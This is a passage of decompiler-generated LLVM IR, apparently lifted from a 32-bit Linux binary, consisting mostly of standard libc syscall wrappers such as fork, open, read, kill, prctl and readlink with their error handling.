  %v1_80520c6 = add i32 %v0_80520c6, -1
  store i32 %v1_80520c6, i32* %ecx.global-to-local, align 4
  %v3_80520c7 = inttoptr i32 %v2_80520c7 to i8*
  store i8 %v2_80520c4, i8* %v3_80520c7, align 1
  %v0_80520c9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80520c9 = add i32 %v0_80520c9, 1
  store i32 %v1_80520c9, i32* %edx.global-to-local, align 4
  %v0_80520ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520ca = add i32 %v0_80520ca, 1
  store i32 %v1_80520ca, i32* %ebx.global-to-local, align 4
  %v0_80520cb = load i32, i32* %ecx.global-to-local, align 4
  %v10_80520cb = icmp eq i32 %v0_80520cb, -1
  %v1_80520ce = icmp eq i1 %v10_80520cb, false
  br i1 %v1_80520ce, label %dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge, label %dec_label_pc_80520d0.loopexit

dec_label_pc_80520c4.dec_label_pc_80520c4_crit_edge: ; preds = %dec_label_pc_80520c4
  %v4_80520c4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80520c4

dec_label_pc_80520d0.loopexit:                    ; preds = %dec_label_pc_80520c4
  br label %dec_label_pc_80520d0

dec_label_pc_80520d0:                             ; preds = %dec_label_pc_80520d0.loopexit, %dec_label_pc_80520bb, %dec_label_pc_8052050
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_80520e0:                             ; preds = %dec_label_pc_8052067
  store i8 48, i8* %tmp25, align 1
  %v2_80520e3 = add i32 %arg3, 1
  %v3_80520e3 = inttoptr i32 %v2_80520e3 to i8*
  store i8 0, i8* %v3_80520e3, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_80520f6:                             ; preds = %dec_label_pc_80520a4
  %v0_80520f6 = load i32, i32* @esp, align 4
  %v2_80520f6 = add i32 %v0_805209b, 13
  %v3_80520f6 = add i32 %v2_80520f6, %v0_80520f6
  %v4_80520f6 = inttoptr i32 %v3_80520f6 to i8*
  store i8 45, i8* %v4_80520f6, align 1
  %v1_80520a9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520a9

dec_label_pc_80520fd:                             ; preds = %dec_label_pc_805206b
  %v1_80520ff = icmp eq i1 %v3_8052067, false
  br i1 %v1_80520ff, label %dec_label_pc_8052079, label %dec_label_pc_8052105

dec_label_pc_8052105:                             ; preds = %dec_label_pc_80520fd
  %v1_8052107 = sub i32 0, %v4_805205b
  br label %dec_label_pc_805207d

dec_label_pc_8052115:                             ; preds = %dec_label_pc_80520a9
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_80520a9, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80520c4

; uselistorder directives
  uselistorder i32 %v1_80520ca, { 1, 0 }
  uselistorder i32 %v1_80520c9, { 1, 0 }
  uselistorder i32 %v1_80520b4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80520a9, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div20, { 1, 2, 0 }
  uselistorder i32 %v1_805209b, { 1, 0 }
  uselistorder i32 %v4_805205b, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520c4, { 0, 2, 1 }
}

define i32 @function_805211d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805211d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805211d = load i32, i32* @edi, align 4
  %v0_805211e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052132 = add i32 %arg2, -12
  %v6_805213c = icmp ugt i32 %v1_8052132, 2
  br i1 %v6_805213c, label %dec_label_pc_805214c, label %dec_label_pc_805213e

dec_label_pc_805213e:                             ; preds = %dec_label_pc_805211d
  %v4_8052142 = call i32 @function_8052174(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8052132)
  br label %dec_label_pc_805216e

dec_label_pc_805214c:                             ; preds = %dec_label_pc_805211d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052154 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052154, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8052154, -4095
  br i1 %tmp17, label %dec_label_pc_805216c, label %dec_label_pc_8052160

dec_label_pc_8052160:                             ; preds = %dec_label_pc_805214c
  %v1_8052160 = call i32 @function_8052719(i32 %v0_805211e)
  %v0_8052165 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052165 = sub i32 0, %v0_8052165
  %v2_8052167 = inttoptr i32 %v1_8052160 to i32*
  store i32 %v1_8052165, i32* %v2_8052167, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805216c

dec_label_pc_805216c:                             ; preds = %dec_label_pc_805214c, %dec_label_pc_8052160
  %v0_805216c = phi i32 [ %v2_8052154, %dec_label_pc_805214c ], [ -1, %dec_label_pc_8052160 ]
  br label %dec_label_pc_805216e

dec_label_pc_805216e:                             ; preds = %dec_label_pc_805213e, %dec_label_pc_805216c
  %v0_8052173 = phi i32 [ %v4_8052142, %dec_label_pc_805213e ], [ %v0_805216c, %dec_label_pc_805216c ]
  store i32 %v0_805211e, i32* @ebx, align 4
  store i32 %v0_805211d, i32* @edi, align 4
  ret i32 %v0_8052173

; uselistorder directives
  uselistorder i32 %v2_8052154, { 1, 0, 2 }
  uselistorder i32 %v0_805211e, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805216e, { 1, 0 }
  uselistorder label %dec_label_pc_805216c, { 1, 0 }
}

define i32 @function_8052174(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052174:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052174 = load i32, i32* @edi, align 4
  store i32 %v0_8052174, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805218c = load i32, i32* @ebx, align 4
  %v1_8052194 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8052194, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052194, -4095
  br i1 %tmp12, label %dec_label_pc_80521ac, label %dec_label_pc_80521a0

dec_label_pc_80521a0:                             ; preds = %dec_label_pc_8052174
  %v1_80521a0 = call i32 @function_8052719(i32 %v0_805218c)
  %v0_80521a5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80521a5 = sub i32 0, %v0_80521a5
  %v2_80521a7 = inttoptr i32 %v1_80521a0 to i32*
  store i32 %v1_80521a5, i32* %v2_80521a7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80521b1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521ac

dec_label_pc_80521ac:                             ; preds = %dec_label_pc_8052174, %dec_label_pc_80521a0
  %v2_80521b1 = phi i32 [ %v0_8052174, %dec_label_pc_8052174 ], [ %v2_80521b1.pre, %dec_label_pc_80521a0 ]
  %v0_80521ac = phi i32 [ %v1_8052194, %dec_label_pc_8052174 ], [ -1, %dec_label_pc_80521a0 ]
  store i32 %v2_80521b1, i32* %edi.global-to-local, align 4
  ret i32 %v0_80521ac

; uselistorder directives
  uselistorder i32 %v1_8052194, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521ac, { 1, 0 }
}

define i32 @function_80521b3(i8* %arg1) local_unnamed_addr {
dec_label_pc_80521b3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521b3 = load i32, i32* @edi, align 4
  store i32 %v0_80521b3, i32* %stack_var_-4, align 4
  %v4_80521b7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80521b7, i32* %edi.global-to-local, align 4
  %v0_80521bb = load i32, i32* @ebx, align 4
  %v3_80521c3 = call i32 @chdir(i8* %arg1)
  store i32 %v3_80521c3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80521c3, -4095
  br i1 %tmp9, label %dec_label_pc_80521db, label %dec_label_pc_80521cf

dec_label_pc_80521cf:                             ; preds = %dec_label_pc_80521b3
  %v1_80521cf = call i32 @function_8052719(i32 %v0_80521bb)
  %v0_80521d4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80521d4 = sub i32 0, %v0_80521d4
  %v2_80521d6 = inttoptr i32 %v1_80521cf to i32*
  store i32 %v1_80521d4, i32* %v2_80521d6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80521df.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521db

dec_label_pc_80521db:                             ; preds = %dec_label_pc_80521b3, %dec_label_pc_80521cf
  %v2_80521df = phi i32 [ %v0_80521b3, %dec_label_pc_80521b3 ], [ %v2_80521df.pre, %dec_label_pc_80521cf ]
  %v0_80521db = phi i32 [ %v3_80521c3, %dec_label_pc_80521b3 ], [ -1, %dec_label_pc_80521cf ]
  store i32 %v2_80521df, i32* %edi.global-to-local, align 4
  ret i32 %v0_80521db

; uselistorder directives
  uselistorder i32 %v3_80521c3, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521db, { 1, 0 }
}

define i32 @function_80521e1(i32 %arg1) local_unnamed_addr {
dec_label_pc_80521e1:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521e1 = load i32, i32* @edi, align 4
  store i32 %v0_80521e1, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80521e9 = load i32, i32* @ebx, align 4
  %v1_80521f1 = call i32 @close(i32 %arg1)
  store i32 %v0_80521e9, i32* @ebx, align 4
  store i32 %v1_80521f1, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80521f1, -4095
  br i1 %tmp9, label %dec_label_pc_8052209, label %dec_label_pc_80521fd

dec_label_pc_80521fd:                             ; preds = %dec_label_pc_80521e1
  %v1_80521fd = call i32 @function_8052719(i32 %v0_80521e9)
  %v0_8052202 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052202 = sub i32 0, %v0_8052202
  %v2_8052204 = inttoptr i32 %v1_80521fd to i32*
  store i32 %v1_8052202, i32* %v2_8052204, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805220d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052209

dec_label_pc_8052209:                             ; preds = %dec_label_pc_80521e1, %dec_label_pc_80521fd
  %v2_805220d = phi i32 [ %v0_80521e1, %dec_label_pc_80521e1 ], [ %v2_805220d.pre, %dec_label_pc_80521fd ]
  %v0_8052209 = phi i32 [ %v1_80521f1, %dec_label_pc_80521e1 ], [ -1, %dec_label_pc_80521fd ]
  %v2_805220b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805220b, i32* @edx, align 4
  store i32 %v2_805220d, i32* @edi, align 4
  ret i32 %v0_8052209

; uselistorder directives
  uselistorder i32 %v1_80521f1, { 1, 0, 2 }
  uselistorder i32 %v0_80521e9, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052209, { 1, 0 }
}

define i32 @function_805220f() local_unnamed_addr {
dec_label_pc_805220f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805220f = load i32, i32* @ebx, align 4
  store i32 %v0_805220f, i32* %stack_var_-4, align 4
  %v1_8052218 = call i32 @fork(i32 %v0_805220f)
  store i32 %v1_8052218, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052218, -4095
  br i1 %tmp7, label %dec_label_pc_805222f, label %dec_label_pc_8052223

dec_label_pc_8052223:                             ; preds = %dec_label_pc_805220f
  %v1_8052223 = call i32 @function_8052719(i32 %v0_805220f)
  %v0_8052228 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052228 = sub i32 0, %v0_8052228
  %v2_805222a = inttoptr i32 %v1_8052223 to i32*
  store i32 %v1_8052228, i32* %v2_805222a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052233.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805222f

dec_label_pc_805222f:                             ; preds = %dec_label_pc_805220f, %dec_label_pc_8052223
  %v2_8052233 = phi i32 [ %v0_805220f, %dec_label_pc_805220f ], [ %v2_8052233.pre, %dec_label_pc_8052223 ]
  %v0_805222f = phi i32 [ %v1_8052218, %dec_label_pc_805220f ], [ -1, %dec_label_pc_8052223 ]
  store i32 %v2_8052233, i32* @ebx, align 4
  ret i32 %v0_805222f

; uselistorder directives
  uselistorder i32 %v1_8052218, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805222f, { 1, 0 }
}

define i32 @function_8052235() local_unnamed_addr {
dec_label_pc_8052235:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052235 = load i32, i32* @ebx, align 4
  store i32 %v0_8052235, i32* %stack_var_-4, align 4
  %v1_805223e = call i32 @getpid(i32 %v0_8052235)
  store i32 %v1_805223e, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805223e, -4095
  br i1 %tmp7, label %dec_label_pc_8052255, label %dec_label_pc_8052249

dec_label_pc_8052249:                             ; preds = %dec_label_pc_8052235
  %v1_8052249 = call i32 @function_8052719(i32 %v0_8052235)
  %v0_805224e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805224e = sub i32 0, %v0_805224e
  %v2_8052250 = inttoptr i32 %v1_8052249 to i32*
  store i32 %v1_805224e, i32* %v2_8052250, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052259.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052255

dec_label_pc_8052255:                             ; preds = %dec_label_pc_8052235, %dec_label_pc_8052249
  %v2_8052259 = phi i32 [ %v0_8052235, %dec_label_pc_8052235 ], [ %v2_8052259.pre, %dec_label_pc_8052249 ]
  %v0_8052255 = phi i32 [ %v1_805223e, %dec_label_pc_8052235 ], [ -1, %dec_label_pc_8052249 ]
  %v2_8052257 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052257, i32* @edx, align 4
  store i32 %v2_8052259, i32* @ebx, align 4
  ret i32 %v0_8052255

; uselistorder directives
  uselistorder i32 %v1_805223e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052255, { 1, 0 }
}

define i32 @function_805225b() local_unnamed_addr {
dec_label_pc_805225b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805225b = load i32, i32* @ebx, align 4
  store i32 %v0_805225b, i32* %stack_var_-4, align 4
  %v1_8052264 = call i32 @getppid(i32 %v0_805225b)
  store i32 %v1_8052264, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052264, -4095
  br i1 %tmp7, label %dec_label_pc_805227b, label %dec_label_pc_805226f

dec_label_pc_805226f:                             ; preds = %dec_label_pc_805225b
  %v1_805226f = call i32 @function_8052719(i32 %v0_805225b)
  %v0_8052274 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052274 = sub i32 0, %v0_8052274
  %v2_8052276 = inttoptr i32 %v1_805226f to i32*
  store i32 %v1_8052274, i32* %v2_8052276, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805227f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805227b

dec_label_pc_805227b:                             ; preds = %dec_label_pc_805225b, %dec_label_pc_805226f
  %v2_805227f = phi i32 [ %v0_805225b, %dec_label_pc_805225b ], [ %v2_805227f.pre, %dec_label_pc_805226f ]
  %v0_805227b = phi i32 [ %v1_8052264, %dec_label_pc_805225b ], [ -1, %dec_label_pc_805226f ]
  %v2_805227d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805227d, i32* @edx, align 4
  store i32 %v2_805227f, i32* @ebx, align 4
  ret i32 %v0_805227b

; uselistorder directives
  uselistorder i32 %v1_8052264, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805227b, { 1, 0 }
}

define i32 @function_8052281(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052281:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052281 = load i32, i32* @edi, align 4
  store i32 %v0_8052281, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052299 = load i32, i32* @ebx, align 4
  %v2_80522a1 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_80522a1, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_80522a1, -4095
  br i1 %tmp12, label %dec_label_pc_80522b9, label %dec_label_pc_80522ad

dec_label_pc_80522ad:                             ; preds = %dec_label_pc_8052281
  %v1_80522ad = call i32 @function_8052719(i32 %v0_8052299)
  %v0_80522b2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80522b2 = sub i32 0, %v0_80522b2
  %v2_80522b4 = inttoptr i32 %v1_80522ad to i32*
  store i32 %v1_80522b2, i32* %v2_80522b4, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80522be.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522b9

dec_label_pc_80522b9:                             ; preds = %dec_label_pc_8052281, %dec_label_pc_80522ad
  %v2_80522be = phi i32 [ %v0_8052281, %dec_label_pc_8052281 ], [ %v2_80522be.pre, %dec_label_pc_80522ad ]
  %v0_80522b9 = phi i32 [ %v2_80522a1, %dec_label_pc_8052281 ], [ -1, %dec_label_pc_80522ad ]
  store i32 %v2_80522be, i32* %edi.global-to-local, align 4
  ret i32 %v0_80522b9

; uselistorder directives
  uselistorder i32 %v2_80522a1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80522b9, { 1, 0 }
}

define i32 @function_80522c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80522c0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80522c0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80522d3 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_80522d3, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80522d3, -4095
  br i1 %tmp9, label %dec_label_pc_80522ec, label %dec_label_pc_80522e0

dec_label_pc_80522e0:                             ; preds = %dec_label_pc_80522c0
  %v1_80522e0 = call i32 @function_8052719(i32 %v0_80522c0)
  %v0_80522e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522e5 = sub i32 0, %v0_80522e5
  %v2_80522e7 = inttoptr i32 %v1_80522e0 to i32*
  store i32 %v1_80522e5, i32* %v2_80522e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80522f0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522ec

dec_label_pc_80522ec:                             ; preds = %dec_label_pc_80522c0, %dec_label_pc_80522e0
  %v2_80522f0 = phi i32 [ %v0_80522c0, %dec_label_pc_80522c0 ], [ %v2_80522f0.pre, %dec_label_pc_80522e0 ]
  %v0_80522ec = phi i32 [ %v2_80522d3, %dec_label_pc_80522c0 ], [ -1, %dec_label_pc_80522e0 ]
  %v2_80522ee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522ee, i32* @edx, align 4
  store i32 %v2_80522f0, i32* @ebx, align 4
  ret i32 %v0_80522ec

; uselistorder directives
  uselistorder i32 %v2_80522d3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80522ec, { 1, 0 }
}

define i32 @function_80522f2(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80522f2:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80522f3 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80522f9 = sdiv i32 %sext, 16777216
  store i32 %v4_80522f9, i32* @ecx, align 4
  %v4_80522fd = ptrtoint i8* %arg1 to i32
  %v3_8052301 = and i32 %arg2, 64
  %v4_8052301 = icmp eq i32 %v3_8052301, 0
  br i1 %v4_8052301, label %dec_label_pc_8052312, label %dec_label_pc_8052306

dec_label_pc_8052306:                             ; preds = %dec_label_pc_80522f2
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052312

dec_label_pc_8052312:                             ; preds = %dec_label_pc_80522f2, %dec_label_pc_8052306
  %v0_8052312 = phi i32 [ 0, %dec_label_pc_80522f2 ], [ %phitmp, %dec_label_pc_8052306 ]
  store i32 %v0_8052312, i32* @edx, align 4
  store i32 %v4_80522fd, i32* %ebx.global-to-local, align 4
  %v5_805231d = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80522f9)
  store i32 %v5_805231d, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805231d, -4095
  br i1 %tmp15, label %dec_label_pc_8052335, label %dec_label_pc_8052329

dec_label_pc_8052329:                             ; preds = %dec_label_pc_8052312
  %v1_8052329 = call i32 @function_8052719(i32 %v0_80522f3)
  %v0_805232e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805232e = sub i32 0, %v0_805232e
  %v2_8052330 = inttoptr i32 %v1_8052329 to i32*
  store i32 %v1_805232e, i32* %v2_8052330, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052335

dec_label_pc_8052335:                             ; preds = %dec_label_pc_8052312, %dec_label_pc_8052329
  %v0_8052335 = phi i32 [ %v5_805231d, %dec_label_pc_8052312 ], [ -1, %dec_label_pc_8052329 ]
  store i32 %v0_80522f3, i32* @ebx, align 4
  ret i32 %v0_8052335

; uselistorder directives
  uselistorder i32 %v5_805231d, { 1, 0, 2 }
  uselistorder i32 %v4_80522f9, { 1, 0 }
  uselistorder i32 %v0_80522f3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052335, { 1, 0 }
  uselistorder label %dec_label_pc_8052312, { 1, 0 }
}

define i32 @function_805233d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805233d:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805233e = load i32, i32* @esi, align 4
  store i32 %v0_805233e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052356 = load i32, i32* @ebx, align 4
  %v5_805235e = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_805235e, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_805235e, -4095
  br i1 %tmp12, label %dec_label_pc_8052376, label %dec_label_pc_805236a

dec_label_pc_805236a:                             ; preds = %dec_label_pc_805233d
  %v1_805236a = call i32 @function_8052719(i32 %v0_8052356)
  %v0_805236f = load i32, i32* %esi.global-to-local, align 4
  %v1_805236f = sub i32 0, %v0_805236f
  %v2_8052371 = inttoptr i32 %v1_805236a to i32*
  store i32 %v1_805236f, i32* %v2_8052371, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052379.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052376

dec_label_pc_8052376:                             ; preds = %dec_label_pc_805233d, %dec_label_pc_805236a
  %v2_8052379 = phi i32 [ %v0_805233e, %dec_label_pc_805233d ], [ %v2_8052379.pre, %dec_label_pc_805236a ]
  %v0_8052376 = phi i32 [ %v5_805235e, %dec_label_pc_805233d ], [ -1, %dec_label_pc_805236a ]
  store i32 %v2_8052379, i32* %esi.global-to-local, align 4
  ret i32 %v0_8052376

; uselistorder directives
  uselistorder i32 %v5_805235e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052376, { 1, 0 }
}

define i32 @function_805237c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805237c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805237c = load i32, i32* @edi, align 4
  store i32 %v0_805237c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805238c = load i32, i32* @ebx, align 4
  %v4_8052394 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805238c, i32* @ebx, align 4
  store i32 %v4_8052394, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052394, -4095
  br i1 %tmp12, label %dec_label_pc_80523ac, label %dec_label_pc_80523a0

dec_label_pc_80523a0:                             ; preds = %dec_label_pc_805237c
  %v1_80523a0 = call i32 @function_8052719(i32 %v0_805238c)
  %v0_80523a5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80523a5 = sub i32 0, %v0_80523a5
  %v2_80523a7 = inttoptr i32 %v1_80523a0 to i32*
  store i32 %v1_80523a5, i32* %v2_80523a7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80523b0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523ac

dec_label_pc_80523ac:                             ; preds = %dec_label_pc_805237c, %dec_label_pc_80523a0
  %v2_80523b0 = phi i32 [ %v0_805237c, %dec_label_pc_805237c ], [ %v2_80523b0.pre, %dec_label_pc_80523a0 ]
  %v0_80523ac = phi i32 [ %v4_8052394, %dec_label_pc_805237c ], [ -1, %dec_label_pc_80523a0 ]
  store i32 %v2_80523b0, i32* @edi, align 4
  ret i32 %v0_80523ac

; uselistorder directives
  uselistorder i32 %v4_8052394, { 1, 0, 2 }
  uselistorder i32 %v0_805238c, { 1, 0 }
  uselistorder label %dec_label_pc_80523ac, { 1, 0 }
}

define i32 @function_80523b2(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80523b2:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80523b2 = load i32, i32* @edi, align 4
  store i32 %v0_80523b2, i32* %stack_var_-4, align 4
  %v4_80523b6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80523b6, i32* %edi.global-to-local, align 4
  %v0_80523c2 = load i32, i32* @ebx, align 4
  %v7_80523ca = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v0_80523c2, i32* @ebx, align 4
  store i32 %v7_80523ca, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_80523ca, -4095
  br i1 %tmp13, label %dec_label_pc_80523e2, label %dec_label_pc_80523d6

dec_label_pc_80523d6:                             ; preds = %dec_label_pc_80523b2
  %v1_80523d6 = call i32 @function_8052719(i32 %v0_80523c2)
  %v0_80523db = load i32, i32* %edi.global-to-local, align 4
  %v1_80523db = sub i32 0, %v0_80523db
  %v2_80523dd = inttoptr i32 %v1_80523d6 to i32*
  store i32 %v1_80523db, i32* %v2_80523dd, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80523e6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523e2

dec_label_pc_80523e2:                             ; preds = %dec_label_pc_80523b2, %dec_label_pc_80523d6
  %v2_80523e6 = phi i32 [ %v0_80523b2, %dec_label_pc_80523b2 ], [ %v2_80523e6.pre, %dec_label_pc_80523d6 ]
  %v0_80523e2 = phi i32 [ %v7_80523ca, %dec_label_pc_80523b2 ], [ -1, %dec_label_pc_80523d6 ]
  %v2_80523e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80523e4, i32* @edx, align 4
  store i32 %v2_80523e6, i32* @edi, align 4
  ret i32 %v0_80523e2

; uselistorder directives
  uselistorder i32 %v7_80523ca, { 1, 0, 2 }
  uselistorder i32 %v0_80523c2, { 1, 0 }
  uselistorder label %dec_label_pc_80523e2, { 1, 0 }
}

define i32 @function_80523e8() local_unnamed_addr {
dec_label_pc_80523e8:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80523e9 = load i32, i32* @esi, align 4
  store i32 %v0_80523e9, i32* %stack_var_-8, align 4
  %v0_8052401 = load i32, i32* @ebx, align 4
  %v1_8052409 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8052401, i32* @ebx, align 4
  store i32 %v1_8052409, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052409, -4095
  br i1 %tmp12, label %dec_label_pc_8052421, label %dec_label_pc_8052415

